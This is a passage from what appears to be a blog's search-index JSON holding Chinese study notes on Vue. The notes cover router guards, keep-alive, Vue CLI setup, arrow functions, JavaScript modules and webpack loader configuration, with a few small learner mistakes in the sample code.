`$router`为VueRouter实例，想要导航到不同URL，则使用`$router.push`方法\n+ `$route`为当前router跳转对象里面可以获取name、path、query、params等\n\n所有的组件 继承 vue原型\n\n## 5.vue-router导航守卫\n\n实现点击 切换文档标题\n\n### 5.1 生命周期函数\n\n+ created：当组件被创建时调用\n+ mounted：当模板渲染好后被调用\n+ updated：页面更新时被调用\n\n~~~vue\n<script>\n    //user组件为例\n\texport default{\n        name:\"User\",\n        computed:{\n            userId(){\n                return this.$route.params.id\n            }\n        },\n        created(){\n            console.log('created');\n            //在这个时候可以做一些事情  比如将 title改为首页\n            document.title='首页'\n        }\n    }\n</script>\n~~~\n\n### 5.2 全局导航守卫\n\n因为一个一个+需求代码 太麻烦了  \n\n因为所有的跳转都是路由跳转，所以可以监听路由跳转的过程\n\n监听：全局导航守卫\n\n~~~js\n//index.js\nconst routes =[\n    {\n        path:'/home',\n        component:Home,\n        //可以在每个路由加上这个属性\n        meta:{\n            title:'首页'\n        }\n    }\n]\nconst router = new VueRouter({}); //后面\n\n//前置守卫（guard） 跳转前调用\nrouter.beforeEach((to, from, next) => {\n    //从from 跳转到 to  to:route类型 活跃的路由\n    //to.meta.title 第一个的时候是undefined\n    document.title = to.matched[0].meta.title;\n    next(); //必须调用next  不然不会进行下一步\n})\n\n//后置钩子hook 跳转之后调用 不需要主动调用next()函数\nrouter.afterEach((to, from) => {\n    console.log('----');\n}) \n}\n~~~\n\n### 5.3 路由独享守卫\n\n可以到官网学习 : 导航守卫\n\n~~~js\n{\n    path: '/profile',\n    component: Profile,\n    meta: {\n        title: '我的'\n    },\n        //只有进入我的 才会调用\n    beforeEach((to, from, next) => {\n    console.log('in mine');\n    next(); //必须调用next  不然不会进行下一步\n\t})\n}\n~~~\n\n### 5.4 组件内的守卫\n\n~~~js\nconst foo ={\n    template:``\n    ...\n}\n~~~\n\n## 6.vue-router-keep-alive\n\n页面没有保存 组件之前的跳转  \n\n比如：在默认展示新闻的首页，点击消息后，又跳转到 关于 的页面，再跳转会首页的时候，展示的还是新闻的页面\n\n因为组件的生命周期：在跳转到关于页面的时候，把首页的组件 销毁了，然后在点击回首页的时候，是重新创建了一个首页组件 \n\n不希望被创建新的时候，使用keep-alive\n\n### 6.1 keep-alive 遇见 vue-router\n\n+ keep-alive是Vue内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染\n  + include - 字符串或正则表达式，只有匹配的组件会被缓存\n  + exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存\n+ router-view是vue-router的一个组件，如果直接被包再keep-alive里面，所有路径匹配到的视图组件都会被缓存\n\n### 6.2 保存组件状态的解决\n\n> 在App.vue中，将`<router-view>`放在`<keep-alive>`便签里，就可以不重新创建组件\n>\n> ~~~vue\n> <keep-alive><router-view/></keep-alive>  //保持组件状态\n> ~~~\n\n\n\n但是这样还是不行\n\n+ 解决方法一： 还是不行`第二次回到页面的时候，就不行了`\n  + 不在index.js下面设置缺省，`{  path: '',  redirect: 'news' }`\n  + 在Home.vue的created生命周期里，添加`this.$router.push('/home/news')`\n+ 解决方法二：还是不行`后保存的path值是后面点击到的活跃状态的path`\n  + 在Home.vue的data保存一个路径`path:'/home/news'`\n  + `activated(){  this.$router.push(this.path)  }`\n  + `deactivated(){    this.path = this.$router.path;  }`\n+ 解决方法三：行了 组件内导航\n  + 在Home.vue：`activated(){  this.$router.push(this.path)  }`\n  + `beforeRouteLeave(to,from,next){ this.path = this.$route.path; next() }`\n\n **activated() / deactivated()只有该组件被保持了状态 使用了keep-alive时才有效**\n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"05 Vue CLI","url":"/learningNotes/vue/05Vue CLI","content":"\n[TOC]\n\n## 1.Vue CLI介绍和安装\n\n### 1.1 CLI 是什么意思？\n\n+ CLI是Command-Line Interface ，即命令行界面，俗称脚手架\n+ Vue CLI是一个官方发布vue.js项目脚手架\n+ 使用vue-cli可以快速搭建Vue开发环境以及对应的webpack配置\n\n### 1.2 Vue CLI使用前提 - Node\n\nnode环境要求8.9以上版本\n\n### 1.3 Vue CLI使用前提 - Webpack\n\nVue.js官方脚手架工具使用了webpack模板\n\n### 1.4 Vue CLI的使用\n\n1. 安装Vue脚手架 在cmd终端安装\n\n   > ~~~js\n   > npm install -g @vue/cli    //版本3.2.1\n   > \n   > vue --version //查看版本  //装了4.5.12\n   > ~~~\n\n   因为安装的是Vue CLI3的版本 如果想按照Vue CLI2的方式初始化项目是不可以的\n\n2. 拉取2.x版本\n\n   > Vue CLI3和 旧版使用了相同的`vue`命令 ，所以Vue CLI2(`vue-cli`)被覆盖了，如果你仍需使用旧版本的 `vue init`功能，可以全局安装一个桥接工具：\n   >\n   > ~~~js\n   > npm install -g @vue/cli-init  //拉取脚手架2 使用脚手架2\n   > vue init webpack my-project   //使用2 创建项目\n   > ~~~\n\n3. Vue CLI2 初始化项目\n\n   ~~~js\n   vue init webpack my-project\n   ~~~\n\n4. Vue CLI3初始化项目\n\n   ~~~js\n   vue create my-project\n   ~~~\n\n\n\n### 1.5 vuecli-CLI2初始化项目过程\n\n1. In   : `vue init webpack vuecli2test` //项目名字不能大写\n\n2. 下载配置\n\n3. Out: `? Project name (vuecli2test) `    //一般文件名 跟项目名一样 \n\n4. Out:`? Project description (A Vue.js project)` //项目描述\n\n   In    :`test vue cli2`\n\n5. Out:`? Author (piaoliangjiejie2019 <piaoliangjiejie2019@outlook.com>)` //全局git\n\n6. Out:`Runtime + Compiler: recommended for most users\n   Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY allowed in .vue files - render functions are required elsewhere` //询问要用哪个构建项目\n\n   In   :  //选择下面个  打包出的小 运行效率高\n\n7. Out:`? Install vue-router? (Y/n) `  //是否安装路由 暂时not 因为还没学\n\n8. Out:`? Use ESLint to lint your code? (Y/n) ` //对js的限制 规范代码 if不规范会报错\n\n   In   :`y`\n\n   Out:`Standard (https://github.com/standard/standard)\n   Airbnb (https://github.com/airbnb/javascript)\n   none (configure it yourself)` //哪个人的规范\n\n   In   : //暂时选标准\n\n9. Out:`? Set up unit tests (Y/n) `  //单元测试 用的少 n\n\n10. Out:`? Setup e2e tests with Nightwatch? (Y/n) ` //e to e ->end to end 端到端  n\n\n11. Out:`? Should we run npm install for you after the project has been created? (recommended) (Use arrow keys)`\n\n    `Yes, use NPM\n    Yes, use Yarn\n    No, I will handle that myself `  //使用 npm / yarn\n\n    In  : `npm`\n\n<img src='https://s1.328888.xyz/2022/04/09/Xaimv.jpg'>\n\n### 1.6 vuecli-CLI2目录的解析.\n\n+ node test.js 命令 可以直接在终端输出 控制台的内容\n\n<img src='https://s1.328888.xyz/2022/04/09/Xaro0.jpg'>\n\n\n\n## 2.ESLint规范和runtime compiler/only区别\n\n### 2.1 eslint\n\n+ 开了两个项目 01runtimecompiler 装了eslint   02runtimeonly 没装eslint\n\n  > eslint 有很多奇奇怪怪的标准  保存就会显示报错信息\n\n  > 选了后 想关掉eslint ：congif->index.js-> 26 行的 useEslint 改成 false 然后编译即可\n\n###  2.2 runtime compiler和only的区别（p96）\n\n1. 区别只在main.js里\n\n   + runtime compiler：\n\n     ~~~js\n     import Vue from 'vue'\n     import App from './App'\n     \n     Vue.config.productionTip = false\n     \n     /* eslint-disable no-new */\n     new Vue({\n       el: '#app',\n       components: { App },\n       template: '<App/>'\n     })\n     ~~~\n\n   + runtime only：\n\n     ~~~js\n     import Vue from 'vue'\n     import App from './App'\n     \n     Vue.config.productionTip = false\n     \n     /* eslint-disable no-new */\n     new Vue({\n       el: '#app',\n       render: h => h(App) // 相当于\n         //render:function(h){return h(App)}\n     })\n     ~~~\n\n2. vue运行过程\n\n   <img src='https://s1.328888.xyz/2022/04/09/XaA7F.png' style=\"zoom:50%;\" >\n\n3. 对比：\n\n   + runtime-compiler ：\n\n     > template -> ast  -> render -> vdom -> UI\n\n   + runtime-only（性能更高，代码量更少）\n\n     >render -> vdom ->UI\n\n   + 所以尽量使用 runtime-only\n\n4. render 函数 和 createElement函数\n\n   ~~~js\n   //runtime-compiler\n   \n   render: function(createElement) {\n           //1.普通用法： createElement('标签',{标签的属性},['']) \n           //返回的东西 会覆盖 #app的内容\n           // return createElement('h2', { class: 'box' }, ['hello']);\n   \n           //2.传入组件对象\n           //这样的话 就是直接使用render函数 省去了前两步内容 效率更高\n           // return createElement(cpn);\n           return createElement(App);\n       }\n   ~~~\n\n   + 在runtime-only main.js 里 App 已经没有包含 template 了\n\n     > .vue 文件中的template是由 vue-template-compiler ——将.vue文件的template解析成render函数\n\n     \n\n5. 总结：\n\n   + 如果之后的开发中 依然使用template，就需要选择runtime-compiler\n   + 如果使用的是.vue文件 就可以选择runtime-only\n\n\n\n## 3.Vue CLI3(p97-)\n\n### 3.1 vue-cli 3 与 2 的区别\n\n+ vue-cli 3 是基于webpack 4 打造的，vue-cli 2 还是 webpack 3\n+ vue-cli 3 的设计是‘0配置’ ，移除的配置文件根目录下的 build和config等目录\n+ vue-cli 3 提供了vue ui 命令，提供了可视化配置，更加人性化\n+ 移除了static文件夹，新增了public文件夹，并且index.html移动到public中\n\n### 3.2 创建项目\n\nIn：`vue create 03vuecli3test `\n\nOut：`Vue CLI v4.5.12`\n`? Please pick a preset: (Use arrow keys)`   //选择配置\n`>Default ([Vue 2] babel, eslint)  //默认2\nDefault (Vue 3 Preview) ([Vue 3] babel, eslint) //默认3\nManually select features`  //手动  √ \n\nOut：  //按空格是 选择 / 取消\n\n`(*) Choose Vue version  //后面选3.x\n (*) Babel\n ( ) TypeScript\n ( ) Progressive Web App (PWA) Support  //先进app 可以缓存很多东西 也有推送通知\n ( ) Router\n ( ) Vuex\n ( ) CSS Pre-processors  //css预处理器 if用less什么的就可以选\n (*) Linter / Formatter   //eslint\n ( ) Unit Testing   //测试\n ( ) E2E Testing`   //测试\n\nOut：`? Where do you prefer placing config for Babel, ESLint, etc.? (Use arrow keys) `   \n\n`In dedicated config files\nIn package.json`  //配置文件的存放位置  独立文件 /pack.json  选单独的\n\nOut：`? Save this as a preset for future projects? (y/N)` //是否保存配置 会添加到第1个out  y\n\n> 如果想删掉 在 users/lsy/.vuerc   里面有presets 对象 然后删掉里面的 值就可以了\n\nOut：`? Save preset as: ` //保存的名字  coedrwhy\n\n### 3.3 跑项目\n\n#### 3.3.1 cli 2\n\n<img src='https://s1.328888.xyz/2022/04/09/XaHJy.png'>\n\n<img src='https://s1.328888.xyz/2022/04/09/XaqWk.png'>\n\n#### 3.3.2 cli3\n\n看package.json  的scripts的东西  \n\n里面是 serve   & build \n\n所以是 npm run serve 开发/ build 发布  \n\n~~~js\nimport { createApp } from 'vue'\nimport App from './App.vue'\n\ncreateApp(App).mount('#app')\n\n//相当于 \n// new Vue({\n//     el: \"#app\",\n//     render: function(h) {\n//         return h(App)\n//     }\n// })\n~~~\n\n\n\n### 3.4 Vue-Cli3配置文件的查看和修改\n\n+ UI方向的配置\n\n  + 启动配置服务器：vue ui  //启动本地服务器 不用进入哪个地址\n  + 导入 刚建的文件夹  \n  + 左2 插件 左3 依赖 左4 配置 可以改的 左5 任务 可以各种运行\n\n+ src+文件 vue.config.js\n\n  ~~~js\n  module.exports={}   //会跟其他的配置文件合并一起的 放独有的配置\n  ~~~\n\n\n\n## 4.箭头函数的使用和this的指向问题(p99)\n\n### 4.1 基本使用\n\n~~~js\n//1.定义函数的方式：function\nconst aaa = function(){\n    \n}\n//2.对象字面量中定义函数\nconst obj = {\n    bbb:function(){\n        \n    },\n    bbb(){\n        \n    }\n}\n//3.ES6中的箭头函数\nconst ccc = (参数列表) =>{\n    \n}\n\nconst aaa = () =>{\n    \n}\n~~~\n\n\n\n### 4.2 箭头函数参数和返回值\n\n~~~js\n//1.参数问题\n//1.1放入两个参数\nconst sum =(num1,num2) =>{\n    return num1+num2;\n}\n\n//1.2 放一个参数\nconst power = (num) =>{  //括号可以省略\n    return num*num;\n}\n\n//2.返回值\n//2.1 函数代码块中有多行代码\nconst test = () =>{\n    //1.打印Hello World\n    console.log('Hello World');\n    \n    //2.打印Hello Vue\n    console.log('Hello Vue');\n    \n}\n\n//2.2 函数代码块中只有一行代码\nconst mul = (num1,num2) =>{\n    return num1+num2;\n}\n\n//等同于\nconst mul2 = (num1,num2) => num1*num2\n\n//无返回值时 自动将结果作为返回值 给demo\nconst demo = () => console.log('Hello vue')\n~~~\n\n\n\n### 4.3 箭头函数的this的使用\n\n+ 使用箭头函数多：当准备一个函数作为参数传给另一个函数的时候\n\n~~~js\nsetTimeout(function(){\n    console.log(this);  //window\n},1000)\n\nsetTimeout(()=>{\n    console.log(this); //window\n},1000)\n\n//结论：箭头函数中this引用的就是最近作用域中的this\nconst obj ={\n    aaa(){\n        setTimeout(function(){\n            console.log(this); //window\n        })\n        \n        setTimeout(()=>{\n            console.log(this); //obj对象\n        })\n    }\n}\n\n\nconst obj ={\n    aaa(){\n        setTimeout(function(){\n            setTimeout(function(){\n                console.log(this); //window\n            })\n            \n            setTimeout(()=>{\n                console.log(this); //window\n            })\n        })\n        \n        setTimeout(()=>{\n            setTimeout(function(){\n                console.log(this); //window\n            })\n            \n            setTimeout(()=>{\n                console.log(this); //obj\n            })\n        })\n    }\n}\n~~~\n\n","tags":["vue","es6"],"categories":["learningNotes"]},{"title":"04 vue模块化开发","url":"/learningNotes/vue/04模块化开发","content":"\n## 1.什么是模块化\n\n使用模块作为出口：\n\n+ 在匿名函数内定义一个对象\n+ 给对象添加各种需要暴露到外面的属性和方法（不需要暴露的直接定义即可）\n+ 最后将要暴露的对象返回 并且在外面使用一个moudleB接受\n\n在main.js使用：\n\n+ 只需要使用属于自己模块化的属性和方法即可\n\n这就是模块化最基础的封装，事实上模块的封装还有很多高级的话题：\n\n+ 以下就是最简单的模块的原始雏形\n+ 目前前端模块化开发已经有了很多既有的规范，以及应对的方案\n\n常见的模块化规范：\n\n+ CommonJS、AMD、CMD、es6的Modules\n\n\n\n### 1.1 原始的模块化\n\n~~~js\n//这样在别的文件 又不会产生命名冲突 又可以使用曾经声明过的变量 直接使用moduleB.flag\n//早期自己的模块化使用\nvar moduleB = (function(){\n    //导出的对象\n    var obj = {};\n    var name = \"red\";\n    var flag = true;\n    \n    obj.flag = flag;\n    \n    return obj;\n}())\n~~~\n\n### 1.2 CommonJS\n\n~~~js\n//aaa.js\n\nvar name ='ming';\nvar flag = true;\nfunction sum(num1,num2){\n    return num1+num2;\n}\n\n//导出语法  必须要有底层支撑才能解析代码 比如node\nmodule.exports = {\n    flag:flag,\n    sum\n}\n~~~\n\n~~~js\n//mmm.js\n\n//导入\nvar {flag,sum} = require('./aaa.js');  //对象的解构\n //===\nvar aaa = require('./aaa.js');\nvar flag = aaa.flag;\nvar sum = aaa.sum;\n~~~\n\n\n\n### 1.3 es6的模块化的导入导出\n\n~~~html\n<!-- html 使用type=‘module’就可以 使用模块化 不会出现命名冲突 -->\n<script src='aaa.js' type='module'></script>\n<script src='bbb.js' type='module'></script>\n<script src='mmm.js' type='module'></script>\n~~~\n\n\n\n~~~js\n//aaa.js\nvar name = 'ming';\nvar age = 18;\nvar flag = true;\n\nfunction sum(num1,num2){\n    return num1 + num2;\n}\n\nif(flag){\n    console.log(sum(20,30))\n}\n\n//1.导出方式一：导出给其他js使用本js的变量\nexport{\n\tflag,sum\n}\n//2.导出方式二：定义时就导出变量\nexport var num1 = 1000;\nexport var height =  1.88;\n\n//3.导出函数/类\nexport function mul(num1,num2){\n    return num1+num2;\n}\nexport class Person{\n    run(){\n        console.log('running')\n    }\n}\n\n//4.export default\n//某些情况下，一个模块中包含某个功能 我们不希望给这个功能命名 而且想让导入者可以自己来命名\n//在同一个模块中只能有一个\nconst address = 'bj'\nexport default address;\n\nexport default function(arg){\n    console.log(arg);\n}\n~~~\n\n\n\n~~~js\n//mmm.js\n//1.导入{}定义的变量\nimport {flag} from \"./aaa.js\";\n\nif(flag){\n    console.log('xiaoming');\n}\n//2.直接导入export定义的变量\nimport {num1, height} from \"./aaa.js\";\n\n//3.导入export的function\nimport {mul,Person} from \"./aaa.js\";\n\nconst p = new Person();\np.run();\n\n//4.导入export default 导入aaa.js默认导出的东西\nimport addr from \"./aaa.js\";\n\n//5.统一全部导入\nimport * as aaa from \"./aaa.js\";\naaa.flag; \n~~~\n\n## 2.webpack详解\n\n### 2.1 认识webpack\n\nAt its core，webpack is a static module bundler for modern JavaScript applications\n\n从本质上，**webpack**是一个现代的JavaScript应用的**静态模块**打包工具\n\n+ 模块、打包\n  + 打包工具：grunt、gulp、webpack\n\n#### 2.1.1前端模块化\n\n+ 除了ES6的模块化的底层是靠浏览器的支撑外，其他都需要借助别其他的工具，才能进行模块化开发\n\n+ 并且在通过模块化开发完成项目后，还需要处理模块间的各种依赖，并且将其进行整合打包\n\n+ 而webpack其中一个核心就是让我们可能进行模块化开发，并且回帮助我们处理模块间的依赖关系\n\n#### 2.1.2 打包\n\n+ 将webpack中各种资源模块进行打包合并成一个/多个包\n+ 在打包过程中，还可以对资源进行处理，比如压缩图片、scss->css、将es6语法转换成es5语法等\n\n#### 2.1.3 和grunt/gulp的对比\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XOPH1.png\">\n\n### 2.2 webpack的安装（p76）\n\nwebpack为了可以正常运行 必须依赖node环境 \n\nnode环境为了可以正常的执行很多代码，必须其中包含各种依赖的包\n\nnpm工具（node packages manager）\n\n+ 安装node.js Node.js自带了软件包管理工具npm\n  + 查看node版本：cmd：node -v 版本大于8.9\n+ 全局安装webpack（安装3.6.0 因为vue cli2依赖该版本）\n  + 使用npm安装：cmd： npm install webpack@3.6.0 -g\n+ 局部安装webpack\n  + `--save-dev`是开发时依赖，项目打包后不需要使用的\n+ 全局安装后，还需要局部安装：\n  + 在终端直接执行webpack命令，使用的全局安装的webpack\n  + 当在package.json中定义了script时，其中包含了webpack命令，那么使用的是局部webpack\n\n### 2.3 webpack的起步 （p77）\n\n> **通过vs code 运行webpack进行打包时，报错webpack : 无法加载文件 D:\\nodejs\\node_global\\webpack.ps1，因为在此系统上禁止运行脚本。**\n>\n> 解决方案：\n>\n> 1. 以管理员身份运行vs code\n> 2. 执行：get-ExecutionPolicy，显示Restricted，表示状态是禁止的\n> 3. 执行：set-ExecutionPolicy RemoteSigned\n> 4. 这时再执行get-ExecutionPolicy，就显示RemoteSigned\n\ndist文件夹里的就是打包的东西，把这个给服务器就好了\n\n~~~js\n//main.js\n//1.使用commonjs的模块化规范\nconst { add, mul } = require('./mathUtils.js');\n\nconsole.log(add(20, 30));\nconsole.log(mul(20, 30));\n\n//2.使用es6的模块化规范\nimport { name, age, height } from \"./info\"\nconsole.log(name, age, height);\n~~~\n\n~~~js\n//mathUtils.js\nfunction add(num1, num2) {\n    return num1 + num2;\n}\n\nfunction mul(num1, num2) {\n    return num1 * num2;\n}\n\nexport { add, mul }\n~~~\n\n~~~js\n//info.js\n//es6的模块化\nexport const name = \"why\";\nexport const age = 20;\nexport const height = 1.88;\n~~~\n\n> 打包到./dist/dundle.js\n\n<img src='https://s1.328888.xyz/2022/04/09/XaerO.jpg' style=\"zoom:67%;\" >\n\n~~~html\n    <script src=\"./dist/bundle.js\"></script>\n~~~\n\n### 2.4 webpack的配置（p78-82）\n\n#### 2.4.1 入口出口的配置\n\n~~~js\n//index.html同目录下 新建webpack.config.js\n\n//动态获取绝对路径 必须要有path包 下载npm init\n//包名 当时：meetwebpack\n//出口 当时：index.js\n//会生成一个package.json  如果想依赖node.js 一般都会需要 \n//这里path有依赖 这里会全局搜\nconst path = require('path');\n\n//直接用webpack代替webpack ./src/main.js ./dist/dunble.js\n\n//在packae.js 中设置\"build:'webpack'\" 用npm run build 映射 webpack\nmodule.exports = {\n    //入口\n    entry: './src/main.js',\n    //出口\n    output: {\n        //路径 不能使用相对路径 动态获取绝对路径 \n        //对两路径进行拼接  __dirname 全局变量 保存当前文件的路径\n        path: path.resolve(__dirname, 'dist'),\n        //文件名\n        filename: 'bundle.js'\n    },\n}\n~~~\n\n#### 2.4.2 局部安装webpack\n\n怎么直接在控制台打上webpack就能让main.js打包成bundle.js\n\n因为全局webpack的版本可能跟本地不一样 所以还得下载个本地的webpack\n\n> 在package.json中 下载本地webpack后(npm install webpack@3.6.0 - - save-dev) 会自动生成 \n>\n> 开发时依赖–“devDependencies”：{“webpack”：“^3.6.0”}\n>\n> 后面会讲到运行时依赖–“dependencies”:{}\n\n只要在命令行/cmd里面使用的都是终端 使用的都是全局的webpack ：webpack\n\n在package.json定义的scripts优先运行本地  npm run build  / ./node_modules/webpack.config.js\n\n<img src='https://s1.328888.xyz/2022/04/09/XayZP.jpg'>\n\n<img src='https://s1.328888.xyz/2022/04/09/Xau7q.jpg'>\n\n### 2.5 loader的使用\n\n#### 2.5.1webpack中使用css文件的配置\n\n##### 2.5.1.1 介绍\n\n+ 加载css、图片、包括一些高级的将ES6转成ES5代码、将TypeScript转成ES5代码、将scss、less转成css、将.jsx、.vue转成js等等\n+ 这些webpack本身能力做不到，但其扩展对应的loader就可以\n\nloader使用过程：\n\n+ 步骤一：通过npm安装需要使用的loader\n+ 步骤二：在webpack.config.js中的modules关键字下进行配置\n\n大部分loader可以在webpack官网中找到，并且学习对应的用法\n\n##### 2.5.1.2 产生依赖\n\n因为要有依赖才能打包，所以在main.js设置css的依赖\n\n~~~js\n//main.js\n\n//3.依赖css文件\nrequire('./css/normal.css')\n~~~\n\n##### 2.5.1.3 loader\n\n因为直接使用的话会报错 说没有找到适合的loader  然后就去官网https://webpack.js.org (英文网址)/https://webpack.js.com （中文网址）找\n\n> css-loaderrhttps://webpack.js.org/loaders/css-loader/只负责加载 不负责解析 生效\n\n>  style-loaderhttps://webpack.js.org/loaders/style-loader/:将模块的导出作为样式添加到DOM\n\n> \n>\n> 如果报UnhandledPromiseRejectionWarning: TypeError: this.getResolve is not a function\n>\n> 可能是loader版本过高 可以在install时下载 较低版本\n>\n>  npm install --save-dev css-loader@3.3.0\n>\n> npm install --save-dev style-loader@1.0.0\n\n<img src='https://s1.328888.xyz/2022/04/09/XaJkS.png' style=\"zoom:70%;\" >\n\n<img src='https://s1.328888.xyz/2022/04/09/Xag9m.png' style=\"zoom:70%;\" >\n\n<img src='https://s1.328888.xyz/2022/04/09/Xa9WA.png' style=\"zoom:70%;\" >\n\n##### 2.5.1.4 对配置文件的解释\n\n~~~js\n    module: {\n        rules: [{\n            //正则表达式：匹配所有css文件 去应用下面2loader\n            test: /\\.css$/i,\n            //css-loader只负责加载 不负责解析 生效\n            //还得再下载一个style-loader:将模块的导出作为样式添加到DOM\n            //使用多个loader时 从右到左\n            use: [\"style-loader\", \"css-loader\"],\n        }, ],\n    },\n~~~\n\n#### 2.5.2 less文件处理\n\n~~~less\n//special.less\n\n@font-face: 50px;\n@fontColor: orange;\n\nbody {\n    font-size: @font-face;\n    color: @fontColor;\n}\n~~~\n\n~~~js\n//main.js\n\n//4.依赖less文件\nrequire('./css/special.less');\n~~~\n\n文件编写–>终端打包–>报错 说要一个对应的loader处理文件 –>less-loader@4.1.0–>配置文件\n\n~~~js\n\t\t\t{\n               test: /\\.less$/i,\n               use: [{\n                    loader: \"style-loader\",\n                }, {\n                    loader: \"css-loader\",\n                }, {\n                    loader: \"less-loader\", // compiles Less to CSS\n                }]\n            }\n~~~\n\n#### 2.5.3 图片处理\n\ncss引用图片–>file loader–>url loader + file loader@3.0.1–>配置文件\n\n~~~js\n//package.json\n\toutput: {\n        //路径 不能使用相对路径 动态获取绝对路径 \n        //对两路径进行拼接  __dirname 全局变量 保存当前文件的路径\n        path: path.resolve(__dirname, 'dist'),\n        //文件名\n        filename: 'bundle.js',\n        //!!!只要在以后任何有url的地方都会在前面加上dist\n        publicPath: 'dist/'\n    },\n\n\t\t{\n                test: /\\.(png|jpg|gif)$/i,\n                use: [{\n                    loader: 'url-loader',\n                    options: {\n                        //使用小于限制时，会将图片编译成base64位字符串 显示出来\n                        limit: 5000,\n                        //若大于限制，会要使用'file roader'@3.0.1进行加载 安装就好\n                        //base64不需要打包直接从网上获取\n                        //但大于就会将图片进行打包放在dist中  哈希生成名字-->32位hash值 防止名字重复\n                        //所以要加上路径 在output里+“publicPath: 'dist/'”\n                    },\n                }, ],\n            },\n~~~\n\n处理生成的图片名称：\n\n+ 将所有图片放在img，跟原来图片一样的名，同时防止重复\n\n  img/name.hash:8.ext\n\n~~~js\n{\n                test: /\\.(png|jpg|gif)$/i,\n                use: [{\n                    loader: 'url-loader',\n                    options: {\n                        limit: 5000,\n                        //if img/name 那文件==name.png\n                        name: 'img/[name].[hash:8].[ext]'\n                    },\n                }, ],\n            },\n~~~\n\n#### 2.5.4 es6转es5的babel-loader\n\n官网babel loader–>\n\n安装：`npm install --save-dev babel-loader@7 babel-core babel-preset-es2015`\n\n配置webpack.config.js文件\n\n~~~js\n {\n                test: /\\.js$/,\n                //排除 src外的文件夹\n                exclude: /(node_modules|bower_components)/,\n                use: {\n                    loader: 'babel-loader',\n                    options: {\n                        presets: ['es2015']\n                    }\n                }\n            }\n~~~\n\n> 这样的话 打包好的js 就没有es6属性了\n\n### 2.6 webpack中配置Vue\n\n####  2.6.1 引入vue.js\n\n要在项目中使用Vue.js，就需要对其产生依赖，所以先安装\n\n~~~js\nnpm install vue --save  //因为后续在实际项目中会使用到vue，所以并不是开发时依赖的\n//当时是 vue@2.5.21  我的是vue@2.6.12\n~~~\n\n> 会被安装到 node_modules里  就可以把vue当成一个模块\n\n然后在任何一个文件就可以引用 vue\n\n~~~js\n//main.js\n\n//5.使用Vue.js开发\nimport Vue from 'vue'  //没有文件名 就会在 上述包里 找vue \n~~~\n\n编写-> 打包 -> 打开 -> 报错\n\n原因：\n\n> vue有两个版本 ：\n>\n> 1. runtime-only 代码中不能有任何的template 不会编译\n> 2. runtime-complier 可以编译template\n>\n> 报的错就是 因为使用的就是runtime-only版本\n\n解决：\n\n> 修改webpack的配置 添加：\n>\n> ~~~js\n> //webpack.config.js  \n> //与entry同级\n> \n>     resolve: {\n>         //别名\n>         alias: {\n>             //在进行 import Vue from 'vue 操作时 会看vue是否指向 下面的文件夹 \n>             'vue$': 'vue/dist/vue.esm.js'\n>         }\n>     },\n> ~~~\n\n重新打包 ->运行就可以了\n\n####  2.6.2 el和template的区别（一）\n\n+ 因为后面开发 只用一个index.html  在使用组件时 就必要的会修改index.html \n+ 但html模板在之后的开发中，不希望手动来频繁修改\n\n所以 \n\n~~~html\n<!-- 在html中只保留这个代码 -->\n<body>\n    <div id=\"app\">\n    </div>\n    <script src=\"./dist/bundle.js\"></script>\n</body>\n~~~\n\n~~~js\n//在vue实例中 使用template  template会替换掉 el挂载的元素\n\nconst app = new Vue({\n    el: \"#app\",\n    template: `<div><h2>{{ message }}</h2></div>`,\n    data: {\n        message: 'hello webpack!'\n    }\n})\n~~~\n\n#### 2.6.3 完善\n\n将上述\n\n##### 抽取到组件中：\n\n~~~js\nconst App = {\n    template: `\n    <div>\n        <h2>{{ message }}</h2>\n        <button @click='butClick'>按钮</button>\n    </div>\n    `,\n    data() {\n        return {\n            message: 'hello webpack!'\n        }\n    },\n    methods: {\n        btnClick() {\n            alert();\n        }\n    }\n}\n\t\nnew Vue({\n    el: \"#app\",\n    template: '<App />',\n    components: {\n        App\n    },\n    data: {}\n})\n~~~\n\n\n\n##### 抽取对象\n\n~~~js\n//App.js\n\nexport default {\n    template: `\n    <div>\n        <h2>{{ message }}</h2>\n        <button @click='butClick'>按钮</button>\n    </div>\n    `,\n    data() {\n        return {\n            message: 'hello webpack!'\n        }\n    },\n    methods: {\n        btnClick() {\n            alert();\n        }\n    }\n}\n~~~\n\n~~~js\n//main.js\n\n//5.使用Vue进行开发\nimport Vue from 'vue'\nimport App from './vue/app'   //默认导出  不需要大括号\n\nnew Vue({\n    el: \"#app\",\n    template: '<App />',\n    components: {\n        App\n    },\n    data: {}\n})\n~~~\n\n##### 分离app.js 的js与模板\n\n~~~vue\n//app.vue\n\n<template>\n  <div class=\"title\">\n    <h2>{{ message }}</h2>\n    <button @click=\"butClick\">按钮</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: \"App\",\n  data() {\n    return {\n      message: \"hello webpack!\",\n    };\n  },\n  methods: {\n    btnClick() {\n      alert();\n    },\n  },\n};\n</script>\n\n<style scoped>\n.title {\n  color: red;\n}\n</style>\n~~~\n\n~~~js\n//main.js\n\n//5.使用Vue进行开发\nimport Vue from 'vue'\n// import App from './vue/app'\nimport App from './vue/app.vue'\n\n\nnew Vue({\n    el: \"#app\",\n    template: '<App />',\n    components: {\n        App\n    },\n    data: {}\n})\n~~~\n\n运行后 会报错 因为使用了.vue文件  要配loader\n\n##### 配置vue-loader\n\n~~~js\n//安装 vue-loader  vue-template-compiler\nnpm install vue-loader  vue-template-compiler --save-dev\n\n//webpack.config.js配置文件\n{\n    test:/\\.vue$/,\n    use:['vue-loader']\n}\n~~~\n\n> 报错的话 可能是vue-loader版本太高  可以修改低于14的版本  ‘^13.0.0’  然后再终端 npm install 重新下载 然后就可以了\n\n##### 组件化使用\n\n~~~vue\n//Cpn.vue\n\n<template>\n  <div>\n    <h2>{{ message }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: \"Cpn\",\n  data() {\n    return {\n      message: \"Cpn组件\",\n    };\n  },\n};\n</script>\n\n<style scoped>\n</style>\n~~~\n\n~~~vue\n//app.vue\n//import Cpn from \"./Cpn.vue\";\n//注册 组件 compontents: {Cpn,},\n//使用组件  单/双标签 都可 <Cpn></Cpn>\n<template>\n  <div class=\"title\">\n    <h2>{{ message }}</h2>\n    <button @click=\"butClick\">按钮</button>\n    <Cpn></Cpn>\n  </div>\n</template>\n\n<script>\nimport Cpn from \"./Cpn.vue\";   \n\nexport default {\n  name: \"App\",\n  components: {\n    